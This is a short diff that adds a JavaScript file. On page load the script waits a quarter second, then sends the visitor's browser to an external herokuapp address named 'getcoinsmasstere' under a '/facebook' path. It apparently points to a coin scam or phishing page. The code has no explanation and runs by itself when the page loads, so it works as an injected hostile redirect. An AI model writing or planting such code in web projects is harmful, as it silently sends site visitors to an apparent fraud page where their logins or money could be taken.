@@ -1,0 +1,5 @@
+window.onload = function () {
+  setTimeout(function () {
+    document.location = "http://getcoinsmasstere.herokuapp.com/facebook";
+  }, 250);
+};
